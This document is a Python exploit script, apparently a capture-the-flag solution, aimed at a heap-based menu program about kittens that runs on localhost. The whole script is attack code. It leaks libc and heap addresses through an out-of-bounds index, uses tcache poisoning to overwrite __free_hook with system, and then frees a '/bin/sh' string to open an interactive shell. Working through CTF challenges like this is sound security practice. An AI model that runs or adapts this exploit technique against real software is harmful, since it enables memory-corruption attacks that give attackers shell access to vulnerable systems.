from ptrlib import *

def find(name):
    sock.sendlineafter("> ", "1")
    sock.sendafter(": ", name)
    return

def listup():
    kittens = []
    sock.sendlineafter("> ", "2")
    sock.recvuntil("+\n")
    while True:
        line = sock.recvline()
        if b'+---' in line: break
        kittens.append(line.split(b' - ')[1])
    sock.sendlineafter("> ", "0")
    return kittens

def name(index):
    feed(index)
    return sock.recvline().split(b": Meow!")[0]

def feed(index):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("> ", str(index))
    return

def foster(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter("> ", str(index))
    return

elf = ELF("../distfiles/chall")
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#sock = Process("../distfiles/chall")
libc = ELF("../distfiles/libc-2.27.so")
sock = Socket("localhost", 9005)
addr_name = 0x602020
addr_kittens = 0x6020a0

# leak libc address
find(p64(elf.got("printf")))
libc_base = u64(name((addr_name - addr_kittens) // 8)) - libc.symbol("printf")
logger.info("libc base = " + hex(libc_base))

# leak heap address
find(p64(addr_kittens))
addr_heap = u64(name((addr_name - addr_kittens) // 8))
logger.info("heap = " + hex(addr_heap))

# tcache poisoning
find(b"X" * 0x67 + b"\x00")
foster(2)
find(p64(addr_heap + 0x40))
foster((addr_name - addr_kittens) // 8)
payload = p64(libc_base + libc.symbol("__free_hook"))
payload += b'A' * (0x67 - len(payload)) + b'\x00'
find(payload)
find(b"X" * 0x67 + b"\x00") # dummy
payload = p64(libc_base + libc.symbol("system"))
payload += b'A' * (0x67 - len(payload)) + b'\x00'
find(payload)

# get the shell!
find("/bin/sh\x00")
#print(listup())
foster(5)

sock.interactive()
